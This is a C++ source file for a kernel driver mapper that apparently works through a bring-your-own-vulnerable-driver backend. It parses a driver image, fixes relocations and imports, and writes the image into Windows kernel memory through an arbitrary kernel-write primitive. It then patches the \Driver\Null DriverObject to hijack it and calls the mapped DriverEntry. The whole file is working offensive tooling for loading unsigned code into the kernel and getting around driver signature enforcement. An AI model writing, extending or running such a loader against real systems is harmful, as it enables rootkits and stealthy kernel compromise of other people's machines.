#include "hinv_mapper.hpp"
#include "hinv_kmem.hpp"
#include <fstream>
#include <iostream>
#include <cstring>
#include <cwctype>
#include <algorithm>

namespace hinv {
namespace mapper {

static std::wstring ToLower(std::wstring s) {
    std::transform(s.begin(), s.end(), s.begin(), ::towlower);
    return s;
}

static std::wstring ToWstring(const std::string& s) {
    std::wstring out(s.size(), L' ');
    std::copy(s.begin(), s.end(), out.begin());
    return out;
}

static bool ReadFileBytes(const std::wstring& path, std::vector<uint8_t>& out) {
    std::ifstream file(path.c_str(), std::ios::binary | std::ios::ate);
    if (!file.is_open()) return false;
    auto size = file.tellg();
    file.seekg(0, std::ios::beg);
    out.resize(static_cast<size_t>(size));
    file.read(reinterpret_cast<char*>(out.data()), size);
    return file.good();
}

static uint16_t R16(const uint8_t* p) { return *reinterpret_cast<const uint16_t*>(p); }
static uint32_t R32(const uint8_t* p) { return *reinterpret_cast<const uint32_t*>(p); }
static uint64_t R64(const uint8_t* p) { return *reinterpret_cast<const uint64_t*>(p); }

// ---------------------------------------------------------------------------
// Resolve a single import name to a kernel virtual address.
// ---------------------------------------------------------------------------

static uint64_t ResolveImport(byovd::IByovdBackend* backend, const std::string& dllName,
                              const std::string& procName, uint16_t ordinal, bool byOrdinal) {
    if (byOrdinal) {
        (void)ordinal;
        return 0;
    }

    std::wstring modName = kmem::NormalizeModuleName(dllName);
    return kmem::ResolveKernelExport(backend, modName.c_str(), procName.c_str());
}

// ---------------------------------------------------------------------------
// Build the mapped driver image in usermode and resolve its imports.
// ---------------------------------------------------------------------------

static bool BuildMappedImage(byovd::IByovdBackend* backend, const std::vector<uint8_t>& raw,
                             uint64_t imageBase, std::vector<uint8_t>& mapped) {
    if (raw.size() < sizeof(IMAGE_DOS_HEADER)) return false;
    const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(raw.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;

    // Validate e_lfanew before dereferencing the NT header.
    if (dos->e_lfanew < sizeof(IMAGE_DOS_HEADER) ||
        dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > raw.size())
        return false;

    const auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(raw.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
    if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return false;

    uint32_t imageSize = nt->OptionalHeader.SizeOfImage;
    uint64_t preferredBase = nt->OptionalHeader.ImageBase;
    if (imageSize == 0 || imageSize > 0x20000000) return false; // cap at 512 MB

    uint32_t headersSize = nt->OptionalHeader.SizeOfHeaders;
    if (headersSize == 0 || headersSize > imageSize || headersSize > raw.size()) return false;

    mapped.assign(imageSize, 0);

    // Copy headers.
    std::memcpy(mapped.data(), raw.data(), headersSize);

    // Copy sections with bounds checking.
    const auto* sec = IMAGE_FIRST_SECTION(nt);
    for (uint16_t i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (sec[i].PointerToRawData == 0 || sec[i].SizeOfRawData == 0) continue;
        if (sec[i].VirtualAddress >= imageSize) continue;

        size_t rawSize = sec[i].SizeOfRawData;
        if (sec[i].PointerToRawData >= raw.size()) continue;
        if (sec[i].PointerToRawData + rawSize > raw.size())
            rawSize = raw.size() - sec[i].PointerToRawData;
        if (sec[i].VirtualAddress + rawSize > imageSize)
            rawSize = imageSize - sec[i].VirtualAddress;

        std::memcpy(mapped.data() + sec[i].VirtualAddress,
                    raw.data() + sec[i].PointerToRawData,
                    rawSize);
    }

    // Fix base relocation table.
    const auto& relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir.VirtualAddress != 0 && relocDir.Size != 0) {
        if (relocDir.VirtualAddress + relocDir.Size > imageSize) return false;
        uint64_t delta = imageBase - preferredBase;
        uint32_t relocOffset = 0;
        while (relocOffset < relocDir.Size) {
            auto* block = reinterpret_cast<IMAGE_BASE_RELOCATION*>(mapped.data() + relocDir.VirtualAddress + relocOffset);
            uint32_t pageRva = block->VirtualAddress;
            uint32_t blockSize = block->SizeOfBlock;
            if (blockSize < sizeof(IMAGE_BASE_RELOCATION) || blockSize > relocDir.Size - relocOffset) break;
            if (pageRva >= imageSize) break;

            uint32_t numEntries = (blockSize - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);
            auto* entries = reinterpret_cast<uint16_t*>(reinterpret_cast<uint8_t*>(block) + sizeof(IMAGE_BASE_RELOCATION));
            for (uint32_t j = 0; j < numEntries; ++j) {
                uint16_t type = (entries[j] >> 12) & 0xF;
                uint16_t offset = entries[j] & 0xFFF;
                if (pageRva + offset >= imageSize) break;
                uint8_t* addr = mapped.data() + pageRva + offset;
                switch (type) {
                    case IMAGE_REL_BASED_HIGHLOW:
                        *reinterpret_cast<uint32_t*>(addr) += static_cast<uint32_t>(delta);
                        break;
                    case IMAGE_REL_BASED_DIR64:
                        *reinterpret_cast<uint64_t*>(addr) += delta;
                        break;
                    case IMAGE_REL_BASED_HIGH:
                        *reinterpret_cast<uint16_t*>(addr) += static_cast<uint16_t>(delta >> 16);
                        break;
                    case IMAGE_REL_BASED_LOW:
                        *reinterpret_cast<uint16_t*>(addr) += static_cast<uint16_t>(delta);
                        break;
                    default:
                        break;
                }
            }
            relocOffset += blockSize;
        }
    }

    // Resolve imports.
    const auto& importDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.VirtualAddress != 0 && importDir.Size != 0) {
        if (importDir.VirtualAddress >= imageSize) return false;
        auto* importDesc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(mapped.data() + importDir.VirtualAddress);
        size_t guard = 0;
        while (importDesc->Name != 0 && guard++ < 4096) {
            if (importDesc->Name >= imageSize) break;
            const char* dllName = reinterpret_cast<const char*>(mapped.data() + importDesc->Name);

            uint32_t lookupRva = importDesc->OriginalFirstThunk ? importDesc->OriginalFirstThunk : importDesc->FirstThunk;
            if (lookupRva >= imageSize || importDesc->FirstThunk >= imageSize) break;
            auto* lookupThunk = reinterpret_cast<IMAGE_THUNK_DATA64*>(mapped.data() + lookupRva);
            auto* firstThunk = reinterpret_cast<IMAGE_THUNK_DATA64*>(mapped.data() + importDesc->FirstThunk);

            size_t thunkGuard = 0;
            for (size_t idx = 0; ; ++idx) {
                if (thunkGuard++ > 8192) break;
                uint64_t thunkValue = lookupThunk[idx].u1.AddressOfData;
                if (thunkValue == 0) break;
                if (thunkValue >= imageSize) break;

                bool byOrdinal = (thunkValue & IMAGE_ORDINAL_FLAG64) != 0;
                uint16_t ordinal = byOrdinal ? static_cast<uint16_t>(thunkValue & 0xFFFF) : 0;
                std::string procName;
                if (!byOrdinal) {
                    const auto* importByName = reinterpret_cast<const IMAGE_IMPORT_BY_NAME*>(mapped.data() + thunkValue);
                    // Ensure the name fits within the image before copying.
                    size_t maxLen = imageSize - thunkValue - sizeof(uint16_t);
                    const char* namePtr = reinterpret_cast<const char*>(importByName->Name);
                    size_t nameLen = strnlen(namePtr, maxLen);
                    procName.assign(namePtr, nameLen);
                }

                uint64_t resolved = ResolveImport(backend, dllName, procName, ordinal, byOrdinal);
                if (resolved == 0) {
                    std::cerr << "[hinv::mapper] Unresolved import: " << dllName << "!" << procName << "\n";
                    return false;
                }
                firstThunk[idx].u1.Function = resolved;
            }
            ++importDesc;
        }
    }

    return true;
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

MappingResult MapDriverBytes(byovd::IByovdBackend* backend, const std::vector<uint8_t>& rawImage) {
    MappingResult result{};
    if (!backend || rawImage.empty()) {
        result.error = "invalid arguments";
        return result;
    }

    const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(rawImage.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        result.error = "invalid DOS signature";
        return result;
    }
    const auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(rawImage.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        result.error = "invalid NT signature";
        return result;
    }

    uint32_t imageSize = nt->OptionalHeader.SizeOfImage;
    std::cout << "[hinv::mapper] Image size: " << imageSize << " bytes, preferred base: 0x"
              << std::hex << nt->OptionalHeader.ImageBase << std::dec << "\n";

    uint64_t kernelBase = 0;
    if (!kmem::AllocateKernelMemory(backend, imageSize, kernelBase) || !kernelBase) {
        result.error = "kernel allocation failed";
        return result;
    }
    std::cout << "[hinv::mapper] Allocated kernel memory at 0x" << std::hex << kernelBase << std::dec << "\n";

    std::vector<uint8_t> mapped;
    if (!BuildMappedImage(backend, rawImage, kernelBase, mapped)) {
        result.error = "failed to build mapped image";
        kmem::FreeKernelMemory(backend, kernelBase);
        return result;
    }

    // Write prepared image to kernel memory page by page.
    constexpr size_t CHUNK = 0x1000;
    for (size_t off = 0; off < mapped.size(); off += CHUNK) {
        size_t sz = (off + CHUNK > mapped.size()) ? (mapped.size() - off) : CHUNK;
        if (!backend->WriteKernelMemory(kernelBase + off, mapped.data() + off, sz)) {
            result.error = "kernel write failed at offset " + std::to_string(off);
            result.imageBase = kernelBase;
            kmem::FreeKernelMemory(backend, kernelBase);
            return result;
        }
    }
    std::cout << "[hinv::mapper] Wrote " << mapped.size() << " bytes to kernel memory\n";

    // Locate DriverEntry RVA.
    uint32_t entryRva = nt->OptionalHeader.AddressOfEntryPoint;
    uint64_t driverEntryVa = kernelBase + entryRva;

    // Hijack \\Driver\\Null DriverObject.
    uint64_t nullObject = kmem::GetDriverObject(backend, L"\\Driver\\Null");
    if (!nullObject) {
        result.error = "failed to obtain \\Driver\\Null object";
        result.imageBase = kernelBase;
        kmem::FreeKernelMemory(backend, kernelBase);
        return result;
    }
    std::cout << "[hinv::mapper] Hijacked \\Driver\\Null object at 0x" << std::hex << nullObject << std::dec << "\n";

    // Patch \\Driver\\Null DriverObject so it describes the mapped image.
    // DRIVER_OBJECT (x64): DriverStart @ 0x18, DriverSize @ 0x20.
    constexpr uint64_t OFF_DRIVER_START = 0x18;
    constexpr uint64_t OFF_DRIVER_SIZE = 0x20;
    uint64_t origStart = 0;
    uint32_t origSize = 0;
    if (!kmem::ReadU64(backend, nullObject + OFF_DRIVER_START, origStart) ||
        !kmem::ReadU32(backend, nullObject + OFF_DRIVER_SIZE, origSize)) {
        result.error = "failed to read original DriverObject fields";
        result.imageBase = kernelBase;
        return result;
    }
    if (!kmem::WriteU64(backend, nullObject + OFF_DRIVER_START, kernelBase) ||
        !kmem::WriteU32(backend, nullObject + OFF_DRIVER_SIZE, imageSize)) {
        result.error = "failed to patch DriverObject fields";
        result.imageBase = kernelBase;
        return result;
    }

    // Call DriverEntry(DriverObject, RegistryPath = NULL).
    uint32_t status = kmem::CallDriverEntry(backend, driverEntryVa, nullObject, 0);
    std::cout << "[hinv::mapper] DriverEntry returned 0x" << std::hex << status << std::dec << "\n";

    // NOTE: restoring the original DriverStart/DriverSize keeps \\Driver\\Null consistent,
    // but the mapped driver may see stale fields if it references the object after DriverEntry.
    // A future improvement is to allocate a fake DRIVER_OBJECT instead of borrowing null.sys.
    kmem::WriteU64(backend, nullObject + OFF_DRIVER_START, origStart);
    kmem::WriteU32(backend, nullObject + OFF_DRIVER_SIZE, origSize);

    result.success = (status == 0); // STATUS_SUCCESS
    result.imageBase = kernelBase;
    result.driverObject = nullObject;
    result.driverEntryStatus = status;
    if (!result.success) {
        result.error = "DriverEntry returned failure";
    }
    return result;
}

MappingResult MapDriver(byovd::IByovdBackend* backend, const std::wstring& driverPath) {
    std::vector<uint8_t> raw;
    if (!ReadFileBytes(driverPath, raw)) {
        MappingResult r{};
        r.error = "failed to read driver file";
        return r;
    }
    return MapDriverBytes(backend, raw);
}

} // namespace mapper
} // namespace hinv
